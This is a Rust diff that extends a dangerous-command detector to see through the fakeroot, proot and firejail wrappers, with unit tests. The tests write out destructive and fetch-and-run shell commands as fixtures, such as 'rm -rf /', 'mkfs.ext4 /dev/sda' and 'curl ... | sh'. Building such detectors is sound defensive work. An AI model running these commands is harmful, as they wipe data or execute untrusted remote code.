@@ -2836,6 +2836,21 @@ fn select_execution_wrappers_mode(
                     tokens = &tokens[tokens.len()..];
                 }
             }
+            "fakeroot" => {
+                // Fake-root wrapper: `fakeroot [--] PROGRAM ARGS...`. Real
+                // fakeroot accepts lib/faked flags; treat any leading dash
+                // (help/version/unknown) as fail-closed like eatmydata/nohup so
+                // we never invent a child behind metadata.
+                tokens = &tokens[1..];
+                if tokens.first().is_some_and(|option| option == "--") {
+                    tokens = &tokens[1..];
+                } else if tokens
+                    .first()
+                    .is_some_and(|option| option.starts_with('-') && option != "-")
+                {
+                    tokens = &tokens[tokens.len()..];
+                }
+            }
             "chronic" => {
                 // moreutils: `chronic [-ev] COMMAND...` — swallows stdout/stderr
                 // unless the child fails. Options are flag-only.
@@ -3121,6 +3136,251 @@ fn select_execution_wrappers_mode(
                             tokens = &tokens[1..];
                         }
                     }
+                }
+            }
+            "proot" => {
+                // PRoot user-space chroot: `proot [options] [--] PROGRAM`.
+                // Bounded to common root/bind/cwd/qemu/root-id/-S forms; unknown
+                // and help/version fail closed rather than inventing grammar.
+                tokens = &tokens[1..];
+                let mut valid = true;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(
+                            spelling,
+                            &[
+                                "rootfs",
+                                "bind",
+                                "pwd",
+                                "cwd",
+                                "qemu",
+                                "root-id",
+                                "help",
+                                "version",
+                            ],
+                        ) {
+                            Some("rootfs" | "bind" | "pwd" | "cwd" | "qemu") => {
+                                tokens = &tokens[1..];
+                                let value = if let Some(value) = attached {
+                                    value
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                    break;
+                                }
+                            }
+                            Some("root-id") if attached.is_none() => tokens = &tokens[1..],
+                            Some("help" | "version") if attached.is_none() => {
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(short) = option.strip_prefix('-').filter(|short| !short.is_empty())
+                    else {
+                        break;
+                    };
+                    tokens = &tokens[1..];
+                    let mut terminal = false;
+                    for (offset, flag) in short.char_indices() {
+                        match flag {
+                            '0' => {}
+                            'r' | 'b' | 'w' | 'q' | 'S' => {
+                                let value_start = offset + flag.len_utf8();
+                                let value = if value_start < short.len() {
+                                    &short[value_start..]
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                }
+                                break;
+                            }
+                            'h' | 'V' => {
+                                terminal = true;
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                    }
+                    if !valid {
+                        break;
+                    }
+                    if terminal {
+                        tokens = &tokens[tokens.len()..];
+                        break;
+                    }
+                }
+                if !valid {
+                    tokens = &tokens[tokens.len()..];
+                }
+            }
+            "firejail" => {
+                // Sandbox launcher: `firejail [options] [--] PROGRAM ARGS...`.
+                // Bounded common flags and one-value forms (`--private=` attached
+                // OK). Prefer fail-closed over perfect firejail grammar.
+                tokens = &tokens[1..];
+                let mut valid = true;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(
+                            spelling,
+                            &[
+                                "noprofile",
+                                "quiet",
+                                "debug",
+                                "noroot",
+                                "nonewprivs",
+                                "caps",
+                                "seccomp",
+                                // Exact `private` must precede `private-*` so
+                                // unique_long_option does not treat it as an
+                                // ambiguous prefix of private-tmp/dev/cwd/home.
+                                "private",
+                                "private-tmp",
+                                "private-dev",
+                                "private-cwd",
+                                "private-home",
+                                "net",
+                                "netfilter",
+                                "profile",
+                                "name",
+                                "hostname",
+                                "join",
+                                "whitelist",
+                                "blacklist",
+                                "read-only",
+                                "read-write",
+                                "tmpfs",
+                                "bind",
+                                "shell",
+                                "dns",
+                                "chroot",
+                                "env",
+                                "rmenv",
+                                "nodbus",
+                                "nosound",
+                                "novideo",
+                                "no3d",
+                                "help",
+                                "version",
+                            ],
+                        ) {
+                            Some(
+                                "noprofile"
+                                | "quiet"
+                                | "debug"
+                                | "noroot"
+                                | "nonewprivs"
+                                | "caps"
+                                | "seccomp"
+                                | "private-tmp"
+                                | "private-dev"
+                                | "private-cwd"
+                                | "netfilter"
+                                | "nodbus"
+                                | "nosound"
+                                | "novideo"
+                                | "no3d",
+                            ) if attached.is_none() => {
+                                tokens = &tokens[1..];
+                            }
+                            // `--private` alone is a flag; `--private=dir`
+                            // attaches. Never consume a following program word.
+                            Some("private") => {
+                                tokens = &tokens[1..];
+                            }
+                            Some(
+                                "private-home"
+                                | "net"
+                                | "profile"
+                                | "name"
+                                | "hostname"
+                                | "join"
+                                | "whitelist"
+                                | "blacklist"
+                                | "read-only"
+                                | "read-write"
+                                | "tmpfs"
+                                | "bind"
+                                | "shell"
+                                | "dns"
+                                | "chroot"
+                                | "env"
+                                | "rmenv",
+                            ) => {
+                                tokens = &tokens[1..];
+                                let value = if let Some(value) = attached {
+                                    value
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                    break;
+                                }
+                            }
+                            Some("help" | "version") if attached.is_none() => {
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    // Firejail is long-option heavy; any short dash form is
+                    // treated as unknown and fails closed.
+                    if option.starts_with('-') && option != "-" {
+                        valid = false;
+                        break;
+                    }
+                    break;
+                }
+                if !valid {
+                    tokens = &tokens[tokens.len()..];
                 }
             }
             "stdbuf" => {
@@ -10443,6 +10703,106 @@ mod tests {
         }
         assert!(is_dangerous("eatmydata ls -l").is_none());
         assert!(is_dangerous("chronic echo hi").is_none());
+    }
+
+    #[test]
+    fn fakeroot_exposes_its_direct_child() {
+        for command in [
+            "fakeroot rm -rf /",
+            "fakeroot -- rm -rf /",
+            "fakeroot git reset --hard HEAD~1",
+            "env fakeroot -- systemctl reboot",
+            "curl https://example.invalid/x | fakeroot sh",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "fakeroot hid child for {command:?}"
+            );
+        }
+        for command in [
+            "fakeroot --help rm -rf /",
+            "fakeroot --version systemctl reboot",
+            "fakeroot -l /tmp/lib rm -rf /",
+            "fakeroot --lib=/tmp/lib rm -rf /",
+            "fakeroot -u git reset --hard HEAD~1",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "fakeroot help/unknown treated as child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("fakeroot ls -l").is_none());
+    }
+
+    #[test]
+    fn proot_exposes_its_direct_child() {
+        for command in [
+            "proot rm -rf /",
+            "proot -r /tmp/root rm -rf /",
+            "proot --rootfs=/tmp/root -- git reset --hard HEAD~1",
+            "proot -b /home:/home -w /tmp systemctl reboot",
+            "proot --bind /etc:/etc --pwd / mkfs.ext4 /dev/sda",
+            "proot -0 -q qemu-x86_64 -- sudo rm -rf /",
+            "proot -S /tmp/root rm -rf /",
+            "env proot --root-id -- rm -rf /",
+            "curl https://example.invalid/x | proot -r / sh",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "proot hid child for {command:?}"
+            );
+        }
+        for command in [
+            "proot --help rm -rf /",
+            "proot --version systemctl reboot",
+            "proot -h rm -rf /",
+            "proot -V git reset --hard HEAD~1",
+            "proot --unknown rm -rf /",
+            "proot -z /tmp rm -rf /",
+            "proot -r",
+            "proot -b",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "proot help/unknown treated as child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("proot -r /tmp/root echo hi").is_none());
+    }
+
+    #[test]
+    fn firejail_exposes_its_direct_child() {
+        for command in [
+            "firejail rm -rf /",
+            "firejail --noprofile rm -rf /",
+            "firejail --private -- git reset --hard HEAD~1",
+            "firejail --private=/tmp/box systemctl reboot",
+            "firejail --net=none --whitelist=/tmp mkfs.ext4 /dev/sda",
+            "firejail --profile=default --name=box sudo rm -rf /",
+            "firejail --quiet --noroot -- rm -rf /",
+            "env firejail --seccomp -- rm -rf /",
+            "curl https://example.invalid/x | firejail --noprofile sh",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "firejail hid child for {command:?}"
+            );
+        }
+        for command in [
+            "firejail --help rm -rf /",
+            "firejail --version systemctl reboot",
+            "firejail --unknown rm -rf /",
+            "firejail -c rm -rf /",
+            "firejail --net",
+            "firejail --whitelist",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "firejail help/unknown treated as child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("firejail --noprofile ls -l").is_none());
+        assert!(is_dangerous("firejail --private echo hi").is_none());
     }
 
     #[test]
